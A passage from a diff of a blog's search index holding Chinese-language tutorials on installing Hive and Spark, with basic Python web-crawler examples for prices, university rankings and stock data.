@@ -1,6 +1,929 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>hive01-base</title>
+    <url>/2020/01/14/hive01-base/</url>
+    <content><![CDATA[<p>hive的安装和介绍<br>版本：2.3.6<br>hadoop: 2.7.1</p>
+<a id="more"></a>
+<p>hive是一个基于Hadoop的数据仓库工具，用于HDFS文件中数据集的整理、查询、分析，提供一个类SQL的查询语言HiveQL（转换为MapReduce实现）。<br>以下东西来源于文献[1]<br><a href="https://hive.apache.org/" target="_blank" rel="noopener">官网</a><br><a href="https://cwiki.apache.org/confluence/display/Hive/GettingStarted" target="_blank" rel="noopener">官网手册</a></p>
+<h1 id="hive安装"><a href="#hive安装" class="headerlink" title="hive安装"></a>hive安装</h1><p>安装hive，配置mysql。</p>
+<h2 id="下载解压"><a href="#下载解压" class="headerlink" title="下载解压"></a>下载解压</h2><p>从官网下载安装包<code>apache-hive-2.3.6-bin.tar.gz</code><br>对文件进行解压至目录<code>/opt/hive</code><br>修改文件所属：<code>chown -R yijun:yijun hive</code></p>
+<h2 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h2><p>这一步是可选的，可以编辑<code>/etc/profile</code>文件对所有用户都生效，也可选择<code>~/.bashrc</code>仅对当前用户生效。<br>添加如下条目：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export HIVE_HOME=/usr/local/hive</span><br><span class="line">export PATH=$PATH:$HIVE_HOME/bin</span><br><span class="line">export HADOOP_HOME=/usr/local/hadoop</span><br></pre></td></tr></table></figure>
+
+<p>使用source命令使之生效</p>
+<h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><ul>
+<li><p>将<code>hive-default.xml.template</code>重命名为<code>hive-default.xml</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv hive-default.xml.template hive-default.xml</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>新建一个<code>hive-site.xml</code>文件<br>添加如下配置信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;javax.jdo.option.ConnectionURL&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;jdbc:mysql://localhost:3306/hive?createDatabaseIfNotExist=true&lt;/value&gt;</span><br><span class="line">    &lt;description&gt;JDBC connect string for a JDBC metastore&lt;/description&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;javax.jdo.option.ConnectionDriverName&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;com.mysql.jdbc.Driver&lt;/value&gt;</span><br><span class="line">    &lt;description&gt;Driver class name for a JDBC metastore&lt;/description&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;javax.jdo.option.ConnectionUserName&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;hive&lt;/value&gt;</span><br><span class="line">    &lt;description&gt;username to use against metastore database&lt;/description&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;javax.jdo.option.ConnectionPassword&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;hive&lt;/value&gt;</span><br><span class="line">    &lt;description&gt;password to use against metastore database&lt;/description&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>下面的内容是安装配置mysql作为元数据库</p>
+<h2 id="mysql安装"><a href="#mysql安装" class="headerlink" title="mysql安装"></a>mysql安装</h2><p>安装教程见参考文献<a href="http://dblab.xmu.edu.cn/blog/install-mysql/" target="_blank" rel="noopener">2</a></p>
+<p>以下是有关hive配置的步骤</p>
+<ul>
+<li><p>step0: 下载驱动包<br><a href="https://dev.mysql.com/downloads/connector/j/" target="_blank" rel="noopener">驱动地址</a><br>解压并拷贝<code>mysql-connector-java-5.1.40-bin.jar</code>到<code>/usr/local/hive/lib</code>目录下</p>
+<br>
+</li>
+<li><p>step1: 新建名为hive的数据库<br>这个hive数据库与hive-site.xml中配置对应，用来保存hive元数据。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; create database hive;</span><br><span class="line">mysql&gt; use hive; #切换</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>step2: 配置mysql允许hive接入<br>将所有数据库的所有表的所有权限赋给hive用户，后面的hive是配置hive-site.xml中配置的连接密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; grant all on *.* to hive@localhost identified by &apos;hive&apos;;   </span><br><span class="line">mysql&gt; flush privileges;  #刷新mysql系统权限关系表</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="启动hive"><a href="#启动hive" class="headerlink" title="启动hive"></a>启动hive</h2><p>在启动之前，需要保证hadoop集群启动成功。<br><code>./bin/hive</code><br>至此，已经配置了hive，mysql作为元数据的存储库。<br>我在启动过程中的一些报错。</p>
+<ul>
+<li><p>如果报错信息如下，尝试启动metastor服务<code>bin/hive --servie metastore</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FAILED: SemanticException org.apache.hadoop.hive.ql.metadata.HiveException: java.lang.RuntimeException: </span><br><span class="line">Unable to instantiate org.apache.hadoop.hive.ql.metadata.SessionHiveMetaStoreClient</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果报错如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Caused by: MetaException(message:Version information not found in metastore. )</span><br><span class="line">    at org.apache.hadoop.hive.metastore.RetryingHMSHandler.&lt;init&gt;(RetryingHMSHandler.java:83)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>到<code>hive-site.xml</code>中加入如下条目：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;hive.metastore.schema.verification&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;false&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如果报错如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MetaException(message:Required table missing : &quot;`DBS`&quot; in Catalog &quot;&quot; Schema &quot;&quot;. DataNucleus requires this table to perform its persistence operations. Either your MetaData is incorrect, or you need to enable &quot;datanucleus.schema.autoCreateTables&quot;)</span><br><span class="line">	at org.apache.hadoop.hive.metastore.RetryingHMSHandler.&lt;init&gt;(RetryingHMSHandler.java:84)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>hive元数据在远程mysql中，表明远程数据库没有相应对象。<br>解决办法如下：<code>hive-site.xml</code>中加入如下条目。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;datanucleus.schema.autoCreateAll&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;true&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="hive基本操作"><a href="#hive基本操作" class="headerlink" title="hive基本操作"></a>hive基本操作</h1><p>可以查看hive支持的<a href="https://cwiki.apache.org/confluence/display/Hive/LanguageManual+Types" target="_blank" rel="noopener">数据类型</a><br>具体操作命令见文献<a href="http://dblab.xmu.edu.cn/blog/1080-2/" target="_blank" rel="noopener">1</a></p>
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1] <a href="http://dblab.xmu.edu.cn/blog/1080-2/" target="_blank" rel="noopener">http://dblab.xmu.edu.cn/blog/1080-2/</a><br>[2] <a href="http://dblab.xmu.edu.cn/blog/install-mysql/" target="_blank" rel="noopener">http://dblab.xmu.edu.cn/blog/install-mysql/</a></p>
+]]></content>
+      <categories>
+        <category>bigdata</category>
+      </categories>
+      <tags>
+        <tag>hive</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>spark01-basic</title>
+    <url>/2020/01/09/spark01-basic/</url>
+    <content><![CDATA[<p>spark基础部分<br>安装和介绍<br>版本：spark-2.4.4-bin-hadoop2.7.tgz<br>scala 2.11.8<br>可以从清华大学镜像网站下载</p>
+<a id="more"></a>
+<h1 id="0x00-安装"><a href="#0x00-安装" class="headerlink" title="0x00 安装"></a>0x00 安装</h1><p><a href="http://spark.apache.org/docs/2.1.0/" target="_blank" rel="noopener">官网</a><br>部署模式有四种：</p>
+<ul>
+<li>Local模式(单机)</li>
+<li>Standalone模式，用spark自带的简单集群管理器</li>
+<li>YARN模式，使用YARN作为集群管理器</li>
+<li>Mesos模式，使用Mesos作为集群管理器。</li>
+</ul>
+<h2 id="安装Scala环境"><a href="#安装Scala环境" class="headerlink" title="安装Scala环境"></a>安装Scala环境</h2><blockquote>
+<p>Scala是一门现代的多范式编程语言，旨在以简练、优雅及类型安全的方式来表达常用编程模式，平滑地集成了面向对象和函数语言的特性，运行在JVM上，兼容java程序[1]</p>
+<ul>
+<li>下载Scala2.11.8和安装</li>
+</ul>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https://downloads.lightbend.com/scala/2.11.8/scala-2.11.8.tgz</span><br><span class="line">tar -zxvf scala-2.11.8.tgz</span><br><span class="line">sudo mv scala-2.11.8 /opt/scala-2.11.8       </span><br><span class="line">sudo chown -R hadoop:hadoop /opt/scala-2.11.8</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>配置环境变量<br><code>vim /etc/profile</code></p>
+</li>
+<li><p>写入如下内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export SCALA_HOME=/opt/scala-2.11.8</span><br><span class="line">export PATH=$PATH:$SCALA_HOME/bin</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用source命令使之生效</p>
+</li>
+<li><p>验证<br><code>scala -version</code></p>
+</li>
+</ul>
+<h2 id="安装spark"><a href="#安装spark" class="headerlink" title="安装spark"></a>安装spark</h2><ul>
+<li><p>下载spark2.4.4和安装</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http://mirrors.tuna.tsinghua.edu.cn/apache/spark/spark-2.4.4/spark-2.4.4-bin-hadoop2.7.tgz</span><br><span class="line">tar -zxvf spark-2.4.4-bin-hadoop2.7.tgz</span><br><span class="line">sudo mv spark-2.4.4-bin-hadoop2.7 /opt/spark-2.4.4-bin-hadoop2.7</span><br><span class="line">sudo chown -R hadoop:hadoop /opt/spark-2.4.4-bin-hadoop2.7</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置日志级别<br>进入conf目录进行配置<br><code>cd /opt/spark-2.4.4-bin-hadoop2.7/conf/</code><br>使用模板创建日志配置<br><code>cp log4j.properties.template log4j.properties</code><br>修改其中的一行为如下，可以避免测试中输出太多不必要的信息<br><code>log4j.rootCategory=WARN,console</code></p>
+</li>
+<li><p>配置Spark环境路径<br>进入conf目录<br><code>cp ./conf/spark-env.sh.template ./conf/spark.env.sh</code><br>编辑该文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export JAVA_HOME=/usr/lib/jvm/java-8-oracle</span><br><span class="line">export SPARK_HOME=/opt/spark-2.4.4-bin-hadoop2.7</span><br><span class="line">export SCALA_HOME=/opt/scala-2.11.8</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置连接HDFS文件系统的信息<br>编辑<code>./conf/spark.env.sh</code>文件<br>加入如下信息，就会使用HDFS文件系统</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export SPARK_DIST_CLASSPATH=$(/usr/local/hadoop/bin/hadoop classpath)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>一个实例：验证配置是否成功，计算Pi的值</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd spark/bin</span><br><span class="line">./run-example SparkPi</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x01-Spark-shell"><a href="#0x01-Spark-shell" class="headerlink" title="0x01 Spark-shell"></a>0x01 Spark-shell</h1><h2 id="打开交互式Shell"><a href="#打开交互式Shell" class="headerlink" title="打开交互式Shell"></a>打开交互式Shell</h2><p>进入spark目录下的bin文件，可以运行一个自带的交互Shell。<br>执行命令<code>./spark-shell</code><br>退出：<code>ctrl+D</code>，或者命令<code>:quit</code><br>简单测试：<br>输入一个表达式<code>8*2+5</code>会得到一个结果<code>res0: Int=21</code></p>
+<h2 id="读取linux系统本地文件"><a href="#读取linux系统本地文件" class="headerlink" title="读取linux系统本地文件"></a>读取linux系统本地文件</h2><p>可以在spark-shell窗口中读取文件，并显示第一行的内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var file = sc.textFile(&quot;/etc/protocols&quot;)</span><br><span class="line">file.count()</span><br><span class="line">file.first()</span><br></pre></td></tr></table></figure>
+
+<h2 id="读取HDFS文件"><a href="#读取HDFS文件" class="headerlink" title="读取HDFS文件"></a>读取HDFS文件</h2><p>Spark可以不用启动Hadoop就可以运行，需要使用HDFS文件系统的话就必须先启动Hadoop。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">val textFile=sc.textFile(&quot;hdfs://localhost:9000/input/file1.txt&quot;)</span><br><span class="line">textFile.first()</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-Scala编写Spark应用程序"><a href="#0x02-Scala编写Spark应用程序" class="headerlink" title="0x02 Scala编写Spark应用程序"></a>0x02 Scala编写Spark应用程序</h1><p>一般都是使用IDEA进行开发，一些配置见参考文献[3]，是一个词频统计程序。<br>以下介绍的手动编写配置过程，没有使用ida。<br>使用Scala语言编写的程序需要使用<strong>sbt</strong>进行编译打包</p>
+<h2 id="安装sbt"><a href="#安装sbt" class="headerlink" title="安装sbt"></a>安装sbt</h2><ul>
+<li><p>下载sbt-launch</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://repo.typesafe.com/typesafe/ivy-releases/org.scala-sbt/sbt-launch/0.13.11/sbt-launch.jar</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>新建目录<code>/opt/sbt</code><br>改变所属组<code>chown -R yijun:yijun /opt/sbt</code><br>将下载的<code>sbt-launch.jar</code>移动到该目录下</p>
+<br></li>
+<li><p>在<code>/opt/sbt</code>目录下创建脚本<br><code>vim ./sbt</code><br>内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">SBT_OPTS=&quot;-Xms512M -Xmx1536M -Xss1M -XX:+CMSClassUnloadingEnabled -XX:MaxPermSize=256M&quot;</span><br><span class="line">java $SBT_OPTS -jar `dirname $0`/sbt-launch.jar &quot;$@&quot;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>脚本增加可执行权限<code>chmod 755 ./sbt</code><br><br></p>
+<ul>
+<li>检验sbt是否可用<br><code>./sbt sbt-version</code><br>这个步骤很漫长。<br>安装成功后会显示<code>[info] 0.13.11</code>信息。</li>
+</ul>
+<p>之后的步骤见参考文献[1]</p>
+<h2 id="编写程序"><a href="#编写程序" class="headerlink" title="编写程序"></a>编写程序</h2><ul>
+<li><p>新建一个目录作为应用程序根目录，必须使用特定的文件结构(sbt要求的)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~   </span><br><span class="line">mkdir ./sparkapp   </span><br><span class="line">mkdir -p ./sparkapp/src/main/scala</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>新建一个示例程序</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim ./sparkapp/src/main/scala/SimpleApp.scala</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>写入如下代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/* SimpleApp.scala */</span><br><span class="line">import org.apache.spark.SparkContext</span><br><span class="line">import org.apache.spark.SparkContext._</span><br><span class="line">import org.apache.spark.SparkConf</span><br><span class="line"> </span><br><span class="line">object SimpleApp &#123;</span><br><span class="line">  def main(args: Array[String]) &#123;</span><br><span class="line">    #注意修改该文件的路径</span><br><span class="line">    val logFile = &quot;file:///usr/local/spark/README.md&quot; // Should be some file on your system</span><br><span class="line">    val conf = new SparkConf().setAppName(&quot;Simple Application&quot;)</span><br><span class="line">    val sc = new SparkContext(conf)</span><br><span class="line">    val logData = sc.textFile(logFile, 2).cache()</span><br><span class="line">    val numAs = logData.filter(line =&gt; line.contains(&quot;a&quot;)).count()</span><br><span class="line">    val numBs = logData.filter(line =&gt; line.contains(&quot;b&quot;)).count()</span><br><span class="line">    println(&quot;Lines with a: %s, Lines with b: %s&quot;.format(numAs, numBs))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>编写编译配置文件<br>在主目录下<code>./sparkapp</code>中新建文件<code>simple.sbt</code><br>添加如下内容，指定Spark和scala版本<br>其中的参数版本根据<a href="http://spark.apache.org/downloads.html" target="_blank" rel="noopener">官网设置</a><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name := &quot;simple Project&quot;</span><br><span class="line">version := &quot;0.1&quot;</span><br><span class="line">scalaVersion := &quot;2.11.8&quot;</span><br><span class="line">libraryDependencies += &quot;org.apache.spark&quot; %% &quot;spark-core&quot; % &quot;2.4.4&quot;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>可以使用<code>find</code>命令查看文件结构</p>
+<ul>
+<li>sbt打包<br>首先一定要进入工程目录下，<code>cd ~/sparkapp</code><br>然后使用sbt命令进行打包<br>我们已经在安装sbt的步骤中写好了启动脚本<br><code>/opt/sbt/sbt package</code><br>会在<code>target</code>目录下生成jar包<br></li>
+<li>运行程序<br>上一步骤生成的jar包可以通过如下命令提交到spark中去运行。<br>如果配置环境变量，使用命令(在spark的bin目录下)<code>spark-submit</code>。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">spark-submit --class &quot;SimpleApp&quot; simple-project_2.10-1.0.jar</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="0x03-java编写spark应用程序"><a href="#0x03-java编写spark应用程序" class="headerlink" title="0x03 java编写spark应用程序"></a>0x03 java编写spark应用程序</h1><p>来源于参考文献[4]<br>使用java语言编写sprak需使用maven工具<br><code>src/main/</code>下新建<code>SimpleApp.java</code><br>编写程序<br>pom文件中内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;project&gt;</span><br><span class="line">    &lt;groupId&gt;edu.berkeley&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;simple-project&lt;/artifactId&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line">    &lt;name&gt;Simple Project&lt;/name&gt;</span><br><span class="line">    &lt;packaging&gt;jar&lt;/packaging&gt;</span><br><span class="line">    &lt;version&gt;1.0&lt;/version&gt;</span><br><span class="line">    &lt;repositories&gt;</span><br><span class="line">        &lt;repository&gt;</span><br><span class="line">            &lt;id&gt;Akka repository&lt;/id&gt;</span><br><span class="line">            &lt;url&gt;http://repo.akka.io/releases&lt;/url&gt;</span><br><span class="line">        &lt;/repository&gt;</span><br><span class="line">    &lt;/repositories&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt; &lt;!-- Spark dependency --&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.spark&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spark-core_2.11&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.4.4&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以<a href="https://search.maven.org/" target="_blank" rel="noopener">查阅</a>， 搜索<code>spark-core</code><br>同样可以生成jar包，用<code>spark-submit</code>命令提交</p>
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="http://dblab.xmu.edu.cn/blog/spark-quick-start-guide/" target="_blank" rel="noopener">http://dblab.xmu.edu.cn/blog/spark-quick-start-guide/</a><br>[2] <a href="https://www.shiyanlou.com/courses/456/learning/?id=1433" target="_blank" rel="noopener">https://www.shiyanlou.com/courses/456/learning/?id=1433</a><br>[3] <a href="http://dblab.xmu.edu.cn/blog/1492-2/" target="_blank" rel="noopener">http://dblab.xmu.edu.cn/blog/1492-2/</a><br>[4] <a href="http://dblab.xmu.edu.cn/blog/931-2/" target="_blank" rel="noopener">http://dblab.xmu.edu.cn/blog/931-2/</a></p>
+]]></content>
+      <categories>
+        <category>bigdata</category>
+      </categories>
+      <tags>
+        <tag>spark</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>interviewMaterial</title>
+    <url>/2020/01/08/interviewMaterial/</url>
+    <content><![CDATA[<p>面试需要的知识点</p>
+<h1 id="大数据"><a href="#大数据" class="headerlink" title="大数据"></a>大数据</h1><h2 id="分布式计算框架MapReduce"><a href="#分布式计算框架MapReduce" class="headerlink" title="分布式计算框架MapReduce"></a>分布式计算框架MapReduce</h2><p>一个详细的<a href="https://edu.aliyun.com/lesson_1802_15663?spm=5176.10731542.0.0.3de6244bV0ewPg#_15663" target="_blank" rel="noopener">技术参考文档</a></p>
+]]></content>
+      <categories>
+        <category>interview</category>
+      </categories>
+      <tags>
+        <tag>interview</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>crawler</title>
+    <url>/2020/01/07/crawler/</url>
+    <content><![CDATA[<p>爬虫的一些简单实例</p>
+<a id="more"></a>
+
+<h1 id="0x00-爬取淘宝商品和价格"><a href="#0x00-爬取淘宝商品和价格" class="headerlink" title="0x00 爬取淘宝商品和价格"></a>0x00 爬取淘宝商品和价格</h1><p>使用正则和request库。<br>获取数据，对数据进行解析，然后打印输出。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#CrowTaobaoPrice.py</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def getHTMLText(url):</span><br><span class="line">    try:</span><br><span class="line">        r = requests.get(url, timeout=30)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        return r.text</span><br><span class="line">    except:</span><br><span class="line">        return &quot;&quot;</span><br><span class="line">    </span><br><span class="line">def parsePage(ilt, html):</span><br><span class="line">    try:</span><br><span class="line">        plt = re.findall(r&apos;\&quot;view_price\&quot;\:\&quot;[\d\.]*\&quot;&apos;,html)</span><br><span class="line">        tlt = re.findall(r&apos;\&quot;raw_title\&quot;\:\&quot;.*?\&quot;&apos;,html)</span><br><span class="line">        for i in range(len(plt)):</span><br><span class="line">            price = eval(plt[i].split(&apos;:&apos;)[1])</span><br><span class="line">            title = eval(tlt[i].split(&apos;:&apos;)[1])</span><br><span class="line">            ilt.append([price , title])</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;&quot;)</span><br><span class="line"></span><br><span class="line">def printGoodsList(ilt):</span><br><span class="line">    tplt = &quot;&#123;:4&#125;\t&#123;:8&#125;\t&#123;:16&#125;&quot;</span><br><span class="line">    print(tplt.format(&quot;序号&quot;, &quot;价格&quot;, &quot;商品名称&quot;))</span><br><span class="line">    count = 0</span><br><span class="line">    for g in ilt:</span><br><span class="line">        count = count + 1</span><br><span class="line">        print(tplt.format(count, g[0], g[1]))</span><br><span class="line">        </span><br><span class="line">def main():</span><br><span class="line">    goods = &apos;书包&apos;</span><br><span class="line">    depth = 3</span><br><span class="line">    start_url = &apos;https://s.taobao.com/search?q=&apos; + goods</span><br><span class="line">    infoList = []</span><br><span class="line">    for i in range(depth):</span><br><span class="line">        try:</span><br><span class="line">            url = start_url + &apos;&amp;s=&apos; + str(44*i)</span><br><span class="line">            html = getHTMLText(url)</span><br><span class="line">            parsePage(infoList, html)</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line">    printGoodsList(infoList)</span><br><span class="line">    </span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x01-静态页面的大学排名爬取"><a href="#0x01-静态页面的大学排名爬取" class="headerlink" title="0x01 静态页面的大学排名爬取"></a>0x01 静态页面的大学排名爬取</h1><p>只是用简单的正则和BeautifulSoup库<br>打印输出到屏幕</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#CrawUnivRankingB.py</span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import bs4</span><br><span class="line"></span><br><span class="line">def getHTMLText(url):</span><br><span class="line">    try:</span><br><span class="line">        r = requests.get(url, timeout=30)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        return r.text</span><br><span class="line">    except:</span><br><span class="line">        return &quot;&quot;</span><br><span class="line"></span><br><span class="line">def fillUnivList(ulist, html):</span><br><span class="line">    soup = BeautifulSoup(html, &quot;html.parser&quot;)</span><br><span class="line">    for tr in soup.find(&apos;tbody&apos;).children:</span><br><span class="line">        if isinstance(tr, bs4.element.Tag):</span><br><span class="line">            tds = tr(&apos;td&apos;)</span><br><span class="line">            ulist.append([tds[0].string, tds[1].string, tds[3].string])</span><br><span class="line"></span><br><span class="line">def printUnivList(ulist, num):</span><br><span class="line">    tplt = &quot;&#123;0:^10&#125;\t&#123;1:&#123;3&#125;^10&#125;\t&#123;2:^10&#125;&quot;</span><br><span class="line">    print(tplt.format(&quot;排名&quot;,&quot;学校名称&quot;,&quot;总分&quot;,chr(12288)))</span><br><span class="line">    for i in range(num):</span><br><span class="line">        u=ulist[i]</span><br><span class="line">        print(tplt.format(u[0],u[1],u[2],chr(12288)))</span><br><span class="line">    </span><br><span class="line">def main():</span><br><span class="line">    uinfo = []</span><br><span class="line">    url = &apos;http://www.zuihaodaxue.cn/zuihaodaxuepaiming2016.html&apos;</span><br><span class="line">    html = getHTMLText(url)</span><br><span class="line">    fillUnivList(uinfo, html)</span><br><span class="line">    printUnivList(uinfo, 20) # 20 univs</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-爬取股票数据"><a href="#0x02-爬取股票数据" class="headerlink" title="0x02 爬取股票数据"></a>0x02 爬取股票数据</h1><p>使用正则和BeautifulSoup库<br>结果写到文件中</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#CrawBaiduStocksA.py</span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import traceback</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def getHTMLText(url):</span><br><span class="line">    try:</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        return r.text</span><br><span class="line">    except:</span><br><span class="line">        return &quot;&quot;</span><br><span class="line"></span><br><span class="line">def getStockList(lst, stockURL):</span><br><span class="line">    html = getHTMLText(stockURL)</span><br><span class="line">    soup = BeautifulSoup(html, &apos;html.parser&apos;) </span><br><span class="line">    a = soup.find_all(&apos;a&apos;)</span><br><span class="line">    for i in a:</span><br><span class="line">        try:</span><br><span class="line">            href = i.attrs[&apos;href&apos;]</span><br><span class="line">            lst.append(re.findall(r&quot;[s][hz]\d&#123;6&#125;&quot;, href)[0])</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">def getStockInfo(lst, stockURL, fpath):</span><br><span class="line">    for stock in lst:</span><br><span class="line">        url = stockURL + stock + &quot;.html&quot;</span><br><span class="line">        html = getHTMLText(url)</span><br><span class="line">        try:</span><br><span class="line">            if html==&quot;&quot;:</span><br><span class="line">                continue</span><br><span class="line">            infoDict = &#123;&#125;</span><br><span class="line">            soup = BeautifulSoup(html, &apos;html.parser&apos;)</span><br><span class="line">            stockInfo = soup.find(&apos;div&apos;,attrs=&#123;&apos;class&apos;:&apos;stock-bets&apos;&#125;)</span><br><span class="line"></span><br><span class="line">            name = stockInfo.find_all(attrs=&#123;&apos;class&apos;:&apos;bets-name&apos;&#125;)[0]</span><br><span class="line">            infoDict.update(&#123;&apos;股票名称&apos;: name.text.split()[0]&#125;)</span><br><span class="line">            </span><br><span class="line">            keyList = stockInfo.find_all(&apos;dt&apos;)</span><br><span class="line">            valueList = stockInfo.find_all(&apos;dd&apos;)</span><br><span class="line">            for i in range(len(keyList)):</span><br><span class="line">                key = keyList[i].text</span><br><span class="line">                val = valueList[i].text</span><br><span class="line">                infoDict[key] = val</span><br><span class="line">            </span><br><span class="line">            with open(fpath, &apos;a&apos;, encoding=&apos;utf-8&apos;) as f:</span><br><span class="line">                f.write( str(infoDict) + &apos;\n&apos; )</span><br><span class="line">        except:</span><br><span class="line">            traceback.print_exc()</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    stock_list_url = &apos;http://quote.eastmoney.com/stocklist.html&apos;</span><br><span class="line">    stock_info_url = &apos;https://gupiao.baidu.com/stock/&apos;</span><br><span class="line">    output_file = &apos;D:/BaiduStockInfo.txt&apos;</span><br><span class="line">    slist=[]</span><br><span class="line">    getStockList(slist, stock_list_url)</span><br><span class="line">    getStockInfo(slist, stock_info_url, output_file)</span><br><span 